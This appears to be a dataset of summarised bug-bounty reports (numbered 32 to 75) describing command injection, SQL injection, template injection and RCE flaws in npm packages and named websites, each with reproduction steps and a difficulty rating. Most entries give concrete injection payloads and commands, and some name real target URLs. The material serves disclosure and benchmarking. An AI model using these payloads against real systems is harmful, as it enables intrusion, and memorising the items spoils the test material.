+
+Steps to Reproduce:
+1. Install query-mysql module: npm install query-mysql
+2. Run a malicious query by passing SQL injection payload in the id parameter: query.base.fetchById('users', 'noob\' or 1=1-- ', 'username', callback)
+Exploitation Difficulty:
+The vulnerability is straightforward to exploit as it involves basic SQL injection techniques without requiring complex interactions or state manipulation. The attack vector is direct and well-documented in security contexts.
+
+--------------------------------------------------------------------------------
+
+Report 33: Remote Command Execution vulnerability in pullit
+================================================================================
+Vulnerability Description:
+The pullit npm package is vulnerable to remote command execution via malicious branch names due to insecure use of execSync() without proper input sanitization. An attacker can craft a branch name containing shell metacharacters that get executed when a user checks out the branch using pullit.
+
+Steps to Reproduce:
+1. Create a malicious branch name containing command injection: `git checkout -b ";{echo,hello,world}>/tmp/c"`
+2. Run `pullit` and select the malicious branch to trigger command execution
+Exploitation Difficulty:
+The vulnerability involves understanding git branch naming conventions and shell command injection techniques, but the attack path is straightforward once these components are known. The interaction between branch names and shell execution is a well-documented vulnerability pattern.
+
+--------------------------------------------------------------------------------
+
+Report 34: `macaddress` concatenates unsanitized input into exec() command
+================================================================================
+Vulnerability Description:
+The `macaddress` module's `.one(iface, callback)` API does not sanitize the `iface` argument before concatenating it into a shell command passed to `exec()`. This allows command injection if the `iface` parameter is user-controlled.
+
+Steps to Reproduce:
+1. let iface = '../../../etc/passwd; touch /tmp/poof; echo ';
+2. require('macaddress').one(iface, function (err, mac) { console.log("Mac address for this host: %s", mac); });
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of unsanitized input being used in command execution. The attack vector is direct and doesn't require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 35: [open] concatenation of unsanitized input into exec() command
+================================================================================
+Vulnerability Description:
+The 'open' npm package is vulnerable to command injection due to improper sanitization of URLs before they are concatenated into an exec() command. This allows an attacker to execute arbitrary shell commands by crafting malicious URLs.
+
+Steps to Reproduce:
+1. Install the 'open' npm package (version 0.0.5 or vulnerable versions)
+2. Run the following command in Node.js: require("open")("http://example.com/`touch /tmp/tada`");
+3. Check if the file '/tmp/tada' was created on the system
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of command injection through unsanitized input in a shell command. The attack does not require multiple components or complex interactions, and the exploitation method is well-known in security research.
+
+--------------------------------------------------------------------------------
+
+Report 36: `command-exists` concatenates unsanitized input into exec()/execSync() commands
+================================================================================
+Vulnerability Description:
+The `command-exists` module concatenates unsanitized input into `exec()`/`execSync()` commands, allowing command injection. An attacker can execute arbitrary shell commands by crafting a malicious command name.
+
+Steps to Reproduce:
+1. const commandExists = require('command-exists');
+2. commandExists.sync('ls; touch /tmp/foo0');
+3. commandExists('ls; touch /tmp/foo1');
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of unsanitized input being passed to shell commands. The attack does not require multiple components, complex state manipulation, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 37: [pdfinfojs] Command Injection on filename parameter
+================================================================================
+Vulnerability Description:
+The 'pdfinfojs' module is vulnerable to command injection via the filename parameter, which is appended to a command without proper input sanitization, allowing arbitrary command execution.
+
+Steps to Reproduce:
+1. Install the module: npm install pdfinfojs
+2. Run the example code with a malicious filename payload: node index.js
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of unsanitized user input being used in a command execution context, a well-known security issue in Node.js modules.
+
+--------------------------------------------------------------------------------
+
+Report 38: [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
+================================================================================
+Vulnerability Description:
+The vulnerability allows Remote Code Execution (RCE) in the buttle module when run with the --php-bin option. The PHP filename is not sanitized before being passed to the spawn() method, enabling command injection via shell metacharacters (e.g., semicolons) in the URL.
+
+Steps to Reproduce:
+1. Install buttle: `npm i buttle`
+2. Run buttle with PHP support: `./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php`
+3. Execute a curl command with injected shell commands: `curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo "uh oh, RCE :P"`
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common command injection pattern (unsanitized input passed to a shell command) and does not require complex interactions or state manipulation. The attack vector is direct and well-documented in security literature.
+
+--------------------------------------------------------------------------------
+
+Report 39: [git-dummy-commit] Command injection on the msg parameter
+================================================================================
+Vulnerability Description:
+The git-dummy-commit module is vulnerable to command injection via the 'msg' parameter, which is appended to a command without proper escaping. This allows an attacker to execute arbitrary commands on the victim's machine by controlling the 'msg' parameter.
+
+Steps to Reproduce:
+1. Install the module: npm install git-dummy-commit
+2. Create an index.js file with the following content:
+const gitDummyCommit = require('git-dummy-commit');
+gitDummyCommit('"touch a"');
+3. Run the script: node index.js
+4. Check for the newly created file 'a' in the directory: ls
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a direct command injection through a single parameter without any complex interactions or state manipulations. The attack vector is simple and well-known in security testing.
+
+--------------------------------------------------------------------------------
+
+Report 40: [entitlements] Command injection on the 'path' parameter
+================================================================================
+Vulnerability Description:
+No description available
+
+Steps to Reproduce:
+No steps available
+Exploitation Difficulty:
+None
+
+--------------------------------------------------------------------------------
+
+Report 41: SQL Injection Proof of Concept for Starbucks URL
+================================================================================
+Vulnerability Description:
+This vulnerability involves a SQL injection in the Starbucks URL that reveals the use of an Oracle database. By injecting specific CHAR concatenation syntax, the attacker can determine the database type, which simplifies further exploitation.
+
+Steps to Reproduce:
+1. Identify the target URL: https://www.starbucks.de/coffee/our-coffees/format/whole-bean
+2. Inject the URL with Oracle concatenation and CHAR functions to test for SQL injection: https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49)
+3. Observe the error response, indicating Oracle DBMS is used
+4. Repeat the injection with MySQL and MS SQL Server CHAR functions to confirm no errors, ruling out these DBMS
+Exploitation Difficulty:
+The attack involves straightforward SQL injection techniques and does not require complex interactions or state manipulations. The process of elimination to identify the database type is a common and well-documented method.
+
+--------------------------------------------------------------------------------
+
+Report 42: sql injection on  /messagecenter/messagingcenter at https://www.███████/
+================================================================================
+Vulnerability Description:
+The vulnerability is a SQL injection in the search box of the messaging center. By injecting a single quote ('), the application returns a SQL syntax error, confirming the vulnerability. An attacker can exploit this to execute arbitrary SQL commands, potentially compromising the database integrity or exposing sensitive information.
+
+Steps to Reproduce:
+1. Navigate to https://www.████/messagecenter/messagingcenter
+2. Enter a single quote (') in the search box and observe the SQL syntax error in the response
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires testing with a single quote (') in the search box, a common SQL injection test. The error message directly confirms the vulnerability, making it easy to identify without complex interactions or multiple components.
+
+--------------------------------------------------------------------------------
+
+Report 43: ████████ SQL
+================================================================================
+Vulnerability Description:
+The vulnerability is a SQL injection in the 'curID' parameter of the POST request to /requestaccount.php?. By injecting a single quote into the 'curID' parameter, an attacker can cause the application to return an SQL error, demonstrating that the input is not properly sanitized and can be exploited to execute arbitrary SQL commands.
+
+Steps to Reproduce:
+1. Navigate to the vulnerable URL: https://██████████/requestaccount.php?
+2. Intercept the POST request to /requestaccount.php? using a tool like Burp Suite or browser developer tools.
+3. Modify the 'curID' parameter in the POST request to include a single quote: curID=-1'
+4. Observe the SQL error in the response, indicating a SQL injection vulnerability.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple manipulation of a single parameter in a POST request. The error response directly indicates the presence of a SQL injection vulnerability, making it easy to identify without complex interactions or state manipulations.
+
+--------------------------------------------------------------------------------
+
+Report 44: [egg-scripts] Command injection
+================================================================================
+Vulnerability Description:
+egg-script does not sanitize the --stderr command line argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection.
+
+Steps to Reproduce:
+1. Install egg: npm i egg --save
+2. Install egg-scripts: sudo npm i egg-scripts -g --save
+3. Run eggctl with malicious argument: eggctl start --daemon --stderr=/tmp/eggctl_stderr.log; touch /tmp/malicious
+4. Check that the injected command was executed: ls /tmp/
+5. Stop eggctl: eggctl stop
+Exploitation Difficulty:
+The vulnerability involves a straightforward command injection through unsanitized input passed to child_process.exec(). The attack does not require multiple components, complex state manipulation, or novel logic. It is a classic example of command injection with a clear path to exploitation.
+
+--------------------------------------------------------------------------------
+
+Report 45: Command Injection Vulnerability in kill-port Package
+================================================================================
+Vulnerability Description:
+The kill-port package (version 1.3.1) is vulnerable to command injection via the port parameter. An attacker can inject arbitrary OS commands by controlling the port value due to the use of exec in a third-party module.
+
+Steps to Reproduce:
+1. Install the kill-port package (version 1.3.1) in a Node.js environment.
+2. Run the following code snippet that includes a malicious port value: `const kill = require('kill-port'); kill("23;`touch ./success.txt; 2222222222`");`
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of command injection through user-controlled input. The attack does not require multiple components, complex state manipulation, or novel logic. It is a typical case of improper input sanitization leading to command execution.
+
+--------------------------------------------------------------------------------
+
+Report 46: [ascii-art] Command injection
+================================================================================
+Vulnerability Description:
+ascii-art does not sanitize the target command line argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection.
+
+Steps to Reproduce:
+1. Install ascii-art: sudo npm install -g ascii-art (On a pristine Google Cloud instance, I also had to install pkg-config, libcairo2-dev, libjpeg-dev and libgif-dev, and then install ascii-art with unsafe-perm=true).
+2. Run ascii-art with malicious argument: ascii-art preview 'doom"; touch /tmp/malicious; echo "'
+Exploitation Difficulty:
+The vulnerability involves a straightforward command injection through unsanitized input passed to child_process.exec(). The attack does not require multiple components, complex state manipulation, or novel logic. It is a classic example of command injection, which is a well-known vulnerability pattern.
+
+--------------------------------------------------------------------------------
+
+Report 47: Command Injection Vulnerability in win-fork/win-spawn Packages
+================================================================================
+Vulnerability Description:
+The win-spawn and win-fork packages on Windows execute commands in a way that allows command injection, similar to exec rather than spawn, enabling attackers to run arbitrary commands by injecting them into the command string.
+
+Steps to Reproduce:
+1. Override the OS type to simulate Windows environment: `require('os').type = function() {return "Windows_NT"};`
+2. Call win-fork with a command that includes command injection: `spawn('dir C:// && date /T', [], {stdio: 'inherit'});`
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves basic command injection in a well-known execution context (cmd.exe). The tester only needed to understand how the package processes commands on Windows and simulate the environment to observe the behavior.
+
+--------------------------------------------------------------------------------
+
+Report 48: SQL Injection on www.██████████ on countID parameter
+================================================================================
+Vulnerability Description:
+The vulnerability is a SQL injection in the countID parameter of the URL https://www.███/public/saveCount.cfm. This allows an attacker to execute arbitrary SQL queries on the database server, potentially gaining control over it. The server is running Microsoft SQL Server 2008 R2 (SP3).
+
+Steps to Reproduce:
+1. Identify the vulnerable URL: https://www.███/public/saveCount.cfm?countID=4
+2. Use sqlmap to test for SQL injection: python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3
+Exploitation Difficulty:
+The vulnerability is straightforward to discover using automated tools like sqlmap. It does not involve multiple components, complex application states, or novel logic. The attack is a classic SQL injection, which is a well-known and commonly exploited vulnerability.
+
+--------------------------------------------------------------------------------
+
+Report 49: Code Injection Vulnerability in dot Package
+================================================================================
+Vulnerability Description:
+The vulnerability in the dot package allows for code injection through template compilation using Function(), which can be exploited to execute arbitrary JavaScript code. This is particularly dangerous when combined with prototype pollution, as it can lead to remote code execution.
+
+Steps to Reproduce:
+1. var doT = require("dot");
+2. var tempFn = doT.template("<h1>Here is a sample template " + "{{=console.log(23)}}</h1>");
+3. tempFn({})
+Exploitation Difficulty:
+The attack involves understanding the template compilation process in the dot package and how prototype pollution can be leveraged to inject malicious code. The interaction between these components is non-obvious and requires knowledge of JavaScript's prototype chain and the specific implementation details of the dot package.
+
+--------------------------------------------------------------------------------
+
+Report 50: [express-cart] Customer and admin email enumeration through MongoDB injection
+================================================================================
+Vulnerability Description:
+The vulnerability allows for email enumeration of customers and administrators due to lack of input sanitization in MongoDB queries. Attackers can use the $regex operator to perform blind injections and extract email addresses from the database.
+
+Steps to Reproduce:
+1. Identify the login endpoint for customers or administrators in express-cart
+2. Send a crafted request with a MongoDB $regex operator in the email field to test for valid email addresses
+Exploitation Difficulty:
+The attack involves straightforward MongoDB injection using common operators like $regex. While it requires knowledge of MongoDB query syntax, the technique is well-documented and similar to SQL injection attacks, making it relatively easy to discover and exploit.
+
+--------------------------------------------------------------------------------
+
+Report 51: RCE due to ImageTragick v2
+================================================================================
+Vulnerability Description:
+The vulnerability is a Remote Code Execution (RCE) flaw in the image processing service due to an outdated version of ImageMagick (specifically, the ImageTragick v2 issue). The exploit leverages Ghostscript's ability to execute arbitrary commands via specially crafted image files, allowing an attacker to run commands on the server by uploading a malicious image.
+
+Steps to Reproduce:
+1. Prepare a malicious image file containing Ghostscript commands that execute a remote command (e.g., curl to an attacker-controlled server).
+2. Upload the malicious image to the vulnerable endpoint (PATCH /design on manage.booth.pm) as part of a multipart form request.
+Exploitation Difficulty:
+The attack is straightforward and involves a well-documented vulnerability (ImageTragick) with publicly available exploit techniques. The only complexity lies in crafting the malicious image file, but this is a known and documented process. The attack does not involve multiple components, subtle interactions, or complex application states.
+
+--------------------------------------------------------------------------------
+
+Report 52: SQL Injection in Login Page: https://█████/█████████/login.php
+================================================================================
+Vulnerability Description:
+An error-based SQL injection vulnerability exists in the login page, where entering certain control characters in the 'Username' field triggers an Oracle SQL error, indicating improper handling of user input in database queries.
+
+Steps to Reproduce:
+1. Browse to https://█████████/███/login.php
+2. Enter " '; -- " into the username field
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires entering basic SQL injection payloads into a single input field and observing the error response. There are no complex interactions or state manipulations involved.
+
+--------------------------------------------------------------------------------
+
+Report 53: [@azhou/basemodel] SQL injection
+================================================================================
+Vulnerability Description:
+The @azhou/basemodel module is vulnerable to SQL injection due to direct concatenation of user-supplied input (table names, fields, and orderby clauses) into SQL queries without proper escaping. This allows attackers to manipulate queries to read unauthorized data or perform other SQL operations.
+
+Steps to Reproduce:
+1. Initialize the database and create a test table with sample data using @azhou/mysql-wrapper and @azhou/basemodel.
+2. Execute model.getAll() with malicious input in the fields or orderby parameters to demonstrate SQL injection.
+Exploitation Difficulty:
+The vulnerability is straightforward to exploit as it involves basic SQL injection techniques through direct input manipulation in commonly used CRUD operations. The attack does not require complex application state manipulation or understanding of subtle interactions between components.
+
+--------------------------------------------------------------------------------
+
+Report 54: [node-df] RCE via insecure command concatenation
+================================================================================
+Vulnerability Description:
+The node-df module is vulnerable to Remote Code Execution (RCE) via insecure command concatenation. User-supplied input in the 'file' parameter is directly concatenated into a system command without proper sanitization, allowing attackers to execute arbitrary commands on the host system.
+
+Steps to Reproduce:
+1. Install the vulnerable module: npm i node-df
+2. Create a PoC file (poc.js) with the malicious options object containing a command injection payload
+3. Run the PoC: node poc.js
+4. Verify the arbitrary command execution by checking for the created file (HACKED)
+Exploitation Difficulty:
+This vulnerability is straightforward to discover as it follows a common pattern of command injection vulnerabilities where user input is directly concatenated into system commands. The attack vector is obvious once the command construction pattern is identified in the source code, and no complex application state manipulation is required.
+
+--------------------------------------------------------------------------------
+
+Report 55:  SQL Injection on cookie parameter
+================================================================================
+Vulnerability Description:
+The web application is vulnerable to SQL injection via the 'lang' parameter in cookies. Injecting a single quote (') causes an SQL error, indicating improper input sanitization. This allows an attacker to potentially exfiltrate data or perform other malicious SQL operations.
+
+Steps to Reproduce:
+1. Send a GET request to /index.php/search/default?t=1&x=0&y=0 with a modified 'lang' cookie parameter containing a single quote (') to trigger an SQL error.
+2. Observe the SQL error in the response, confirming SQL injection vulnerability. Inject a second quote ('') to see the error disappear, further confirming the vulnerability.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple manipulation of a cookie parameter and observing the SQL error response. No complex interactions or state manipulations are required.
+
+--------------------------------------------------------------------------------
+
+Report 56: [blamer] RCE via insecure command formatting
+================================================================================
+Vulnerability Description:
+The blamer module is vulnerable to Remote Code Execution (RCE) due to insecure command formatting. User input is directly formatted into a command that is executed without proper sanitization, allowing an attacker to execute arbitrary commands on the victim's system.
+
+Steps to Reproduce:
+1. Install the affected module: npm i blamer
+2. Run the PoC file: node poc.js (where poc.js contains the malicious input)
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of insecure command formatting. The attacker only needs to identify the point where user input is incorporated into a command and test for command injection. The interaction is obvious and does not require complex state manipulation or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 57: Several simple remote code execution in pdf-image
+================================================================================
+Vulnerability Description:
+No description available
+
+Steps to Reproduce:
+No steps available
+Exploitation Difficulty:
+None
+
+--------------------------------------------------------------------------------
+
+Report 58: Modify Host Header which is sent to email
+================================================================================
+Vulnerability Description:
+The vulnerability allows an attacker to modify the Host header in a password reset request, causing the system to send a reset link to a fake website controlled by the attacker. This could lead to phishing attacks or credential theft when the victim clicks the malicious link.
+
+Steps to Reproduce:
+1. Go to https://da.theendlessweb.com:2222/
+2. Start Burp Suite and intercept the request after entering a username and clicking 'Send me a Link'
+3. Modify the 'Host' header in the intercepted request to a fake website URL
+4. Forward the modified request
+5. Check the victim's email to see the password reset link pointing to the fake website
+Exploitation Difficulty:
+This vulnerability is straightforward to discover as it only requires intercepting and modifying a single HTTP request header. The attack does not involve complex application states or subtle interactions between components. Manipulating HTTP headers is a common testing technique.
+
+--------------------------------------------------------------------------------
+
+Report 59: Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-10271]
+================================================================================
+Vulnerability Description:
+This vulnerability is a Remote OS Command Execution (RCE) in an outdated Oracle WebLogic server due to CVE-2017-10271. It allows an unauthenticated attacker to execute arbitrary commands by sending a crafted SOAP request to the vulnerable endpoint.
+
+Steps to Reproduce:
+1. Send a POST request to https://raebilling.mtn.co.za/wls-wsat/RegistrationPortTypeRPC with the specified XML payload that includes a sleep command.
+2. Observe the delayed response (15, 20, or 40 seconds) indicating successful execution of the sleep command, confirming the RCE vulnerability.
+Exploitation Difficulty:
+The attack involves a single, well-documented exploit (CVE-2017-10271) with a straightforward payload. The steps are simple and do not require complex interactions or state manipulation. The vulnerability is publicly known and the exploit is widely available.
+
+--------------------------------------------------------------------------------
+
+Report 60: [wireguard-wrapper] Command Injection via insecure command concatenation
+================================================================================
+Vulnerability Description:
+The wireguard-wrapper module is vulnerable to command injection via insecure command concatenation in the 'showconf' function. The 'device' parameter is passed directly into a shell command without proper sanitization, allowing arbitrary command execution.
+
+Steps to Reproduce:
+1. Install the wireguard-wrapper module: npm i --save wireguard-wrapper
+2. Create a PoC JavaScript file (poc.js) with the following content: const { Wg } = require('wireguard-wrapper'); Wg.showconf('; touch HACKED').then(function(config){ console.log('wg0 configuration:', config); console.log('generated configuration file:', config.toString()); });
+3. Execute the poc.js file: node poc.js
+4. Verify that the HACKED file is created: ls
+Exploitation Difficulty:
+This vulnerability is straightforward to discover as it follows a common pattern of command injection vulnerabilities where user input is directly concatenated into a shell command. The attack does not require multiple components, complex state manipulation, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 61: [devcert] Command Injection via insecure command formatting
+================================================================================
+Vulnerability Description:
+The vulnerability is a command injection issue in the devcert module where the `domain` parameter is used unsafely in a command executed via `child_process.execSync`. An attacker can inject arbitrary commands through the `domain` parameter, which are then executed on the victim's system.
+
+Steps to Reproduce:
+1. Create a directory for testing and install the devcert module: `mkdir poc && cd poc && npm i devcert`
+2. Create a PoC JavaScript file (poc.js) with the following content: `const devcert = require('devcert'); async function poc() { let ssl = await devcert.certificateFor('\";touch HACKED;\"'); } poc()`
+3. Execute the poc.js file: `node poc.js`
+4. Verify the HACKED file is created: `ls`
+Exploitation Difficulty:
+The vulnerability involves a straightforward command injection where user input is directly concatenated into a command string without proper sanitization. The attack requires understanding the flow of the `domain` parameter through the code to the point of command execution, but does not involve complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 62: [extra-ffmpeg] Command Injection via insecure command formatting
+================================================================================
+Vulnerability Description:
+The vulnerability is a command injection issue in the extra-ffmpeg module, where user input is directly used in a command string without proper sanitization, allowing arbitrary command execution on the victim's PC.
+
+Steps to Reproduce:
+1. Install the extra-ffmpeg module: npm i extra-ffmpeg
+2. Create a PoC JavaScript file (poc.js) with the following content: const ffmpeg = require('extra-ffmpeg'); ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);
+3. Execute the poc.js file: node poc.js
+4. Verify that the HACKED file is created: ls
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of insecure command formatting in Node.js modules. The attack requires minimal components and the interaction is obvious once the command injection vector is identified.
+
+--------------------------------------------------------------------------------
+
+Report 63: [extra-asciinema] Command Injection via insecure command formatting
+================================================================================
+Vulnerability Description:
+The vulnerability is a command injection issue in the extra-asciinema module where user input is directly used in a command executed via child_process.execSync without any sanitization, allowing arbitrary command execution.
+
+Steps to Reproduce:
+1. Install the extra-asciinema module: npm i extra-asciinema
+2. Create a PoC file (poc.js) with the following content: const asciinema = require('extra-asciinema'); asciinema.uploadSync('; touch HACKED');
+3. Execute the PoC file: node poc.js
+4. Verify the creation of the HACKED file: ls
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of insecure command construction with user input. The attack does not require multiple components, complex state manipulation, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 64: [diskstats] Command Injection via insecure command concatenation
+================================================================================
+Vulnerability Description:
+The diskstats module is vulnerable to command injection via insecure command concatenation in the _fetchSpace and _fetchInodes functions. User-supplied input (path) is directly concatenated into a command executed by child_process.exec without proper sanitization, allowing arbitrary command execution.
+
+Steps to Reproduce:
+1. Install the diskstats module: npm i diskstats
+2. Create a PoC JavaScript file (poc.js) with the following content: const diskstats = require('diskstats'); diskstats.check('; touch HACKED', (err, results) => {});
+3. Execute the PoC file: node poc.js
+4. Verify that the HACKED file was created: ls
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it follows a common pattern of insecure command construction. The attack requires no complex interactions or state manipulation - just identifying the unsanitized user input being passed to exec(). This is a well-known vulnerability pattern in Node.js applications.
+
+--------------------------------------------------------------------------------
+
+Report 65: [vboxmanage.js] Command Injection via insecure command concatenation
+================================================================================
+Vulnerability Description:
+The vulnerability is a command injection issue in the vboxmanage.js module, where user input (vmname) is used to build a command that is executed without proper sanitization. This allows an attacker to execute arbitrary commands on the victim's PC.
+
+Steps to Reproduce:
+1. Install vboxmanage.js module: npm i vboxmanage.js
+2. Create a PoC JavaScript file (poc.js) with the following content: var VBox = require('vboxmanage.js'); VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});
+3. Execute the poc.js file: node poc.js
+4. Verify the HACKED file is created: ls
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common pattern of insecure command concatenation. The attack does not require multiple components or complex interactions, and the exploitation is direct once the vulnerable code path is identified.
+
+--------------------------------------------------------------------------------
+
+Report 66: SQL Injection on the administrator panel
+================================================================================
+Vulnerability Description:
+The admin panel of the website is vulnerable to SQL injection via the login parameter, allowing an attacker to execute arbitrary SQL queries and potentially gain unauthorized access to the database.
+
+Steps to Reproduce:
+1. Navigate to the admin panel login page at https://mtngbissau.com/webadmin/index.php
+2. Enter a SQL injection payload in the login field (e.g., `user'`) and submit the form
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple SQL injection in a login form, a common and well-documented attack vector. The attack does not require multiple components, complex state manipulation, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 67: [gfc] Command Injection via insecure command formatting
+================================================================================
+Vulnerability Description:
+No description available
+
+Steps to Reproduce:
+No steps available
+Exploitation Difficulty:
+None
+
+--------------------------------------------------------------------------------
+
+Report 68: [windows-edge] RCE via insecure command formatting
+================================================================================
+Vulnerability Description:
+The windows-edge module is vulnerable to Remote Code Execution (RCE) due to insecure command formatting. User input is directly incorporated into a system command without proper sanitization, allowing an attacker to execute arbitrary commands on the victim's system.
+
+Steps to Reproduce:
+1. Install the vulnerable module: npm i windows-edge
+2. Run the PoC script: node poc.js (where poc.js contains the malicious command injection)
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common command injection pattern where user input is directly concatenated into a system command. The attack does not require complex interactions or understanding of multiple components.
+
+--------------------------------------------------------------------------------
+
+Report 69: bunyan - RCE via insecure command formatting
+================================================================================
+Vulnerability Description:
+The vulnerability in bunyan allows for Remote Code Execution (RCE) due to insecure command formatting. An attacker can inject arbitrary commands via user input that is directly executed without proper sanitization or checks.
+
+Steps to Reproduce:
+1. Install bunyan: npm install bunyan
+2. Execute the vulnerable command: ./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
+Exploitation Difficulty:
+The vulnerability is straightforward to exploit as it involves direct command injection without the need for complex interactions or state manipulations. The attack vector is clear and does not require understanding of multiple components or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 70: Server-side Template Injection in lodash.js 
+================================================================================
+Vulnerability Description:
+The _.template function in lodash.js does not properly validate user-supplied input, allowing Server-side Template Injection (SSTI). An attacker can inject and execute arbitrary JavaScript code on the server by controlling the input to the _.template function.
+
+Steps to Reproduce:
+1. Create a test application that requires the lodash.js library and uses the _.template function with user-supplied input.
+2. Visit the vulnerable application with a payload in the name parameter, e.g., http://127.0.0.1:8000/?name=Test${JSON.stringify(process.env)}
+Exploitation Difficulty:
+The vulnerability involves a straightforward exploitation of a known template injection flaw in a widely-used library. The attack requires minimal components and no complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 71: Сode injection host  █████████
+================================================================================
+Vulnerability Description:
+The vulnerability is a code injection flaw in the host's gMapBuild.py script, where an attacker can inject and execute arbitrary commands through the mapArea or cumTime parameters, leading to potential remote code execution.
+
+Steps to Reproduce:
+1. Send a POST request to /cgi-bin/gMapBuild.py with the payload containing a sleep command in the mapArea or cumTime parameter.
+2. Observe the server's response time to confirm the code injection vulnerability.
+Exploitation Difficulty:
+The attack involves a straightforward injection of sleep commands to test for vulnerability, without requiring complex application state manipulation or understanding of novel logic. The interaction is direct and the components involved are minimal.
+
+--------------------------------------------------------------------------------
+
+Report 72: Remote Code Execution on █████████
+================================================================================
+Vulnerability Description:
+The vulnerability involves an unauthenticated Apache Solr instance (version 5.5.1) that is susceptible to CVE-2019-0193, allowing an attacker to achieve Remote Code Execution (RCE) by manipulating the Solr configuration and exploiting the data import handler feature.
+
+Steps to Reproduce:
+1. Access the Solr admin interface at the vulnerable URL (e.g., https://██████/solr/)
+2. Navigate to the Core Admin section and copy the path
+3. Update the Solr configuration to include a malicious data import handler
+4. Execute arbitrary code via the data import handler to achieve Remote Code Execution (RCE)
+Exploitation Difficulty:
+The attack involves multiple straightforward steps, including accessing an unauthenticated interface, modifying configuration files, and executing code. The steps are well-documented and do not require complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 73: [arpping] Remote Code Execution
+================================================================================
+Vulnerability Description:
+No description available
+
+Steps to Reproduce:
+No steps available
+Exploitation Difficulty:
+None
+
+--------------------------------------------------------------------------------
+
+Report 74: [imagickal] Remote Code Execution
+================================================================================
+Vulnerability Description:
+The imagickal module is vulnerable to command injection via insecure processing of user-supplied input in the identify function, allowing arbitrary command execution.
+
+Steps to Reproduce:
+1. Run npm i imagickal
+2. Create and run the following POC index.js: var im = require('imagickal'); im.identify('image.jpg;touch HACKED;').then(function (data) { console.log(data); });
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common command injection pattern where user input is directly passed to a system command without proper sanitization. The attack does not require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 75: [SQLI ]Time  Bassed Injection at ██████████ via referer header
+================================================================================
+Vulnerability Description:
+The vulnerability is a time-based SQL injection via the 'Referer' header, allowing an attacker to execute arbitrary SQL queries and potentially dump the database by manipulating the response time of the server.
+
+Steps to Reproduce:
+1. Copy the request to Burp Suite and modify the 'Referer' header to include a time-based SQL injection payload.
+2. Send the modified request and observe the response time to confirm the injection is successful.
+Exploitation Difficulty:
+The attack involves a straightforward manipulation of the 'Referer' header with a common SQL injection technique (time-based). It does not require complex interactions or understanding of multiple components.
+
+--------------------------------------------------------------------------------
+
+
+
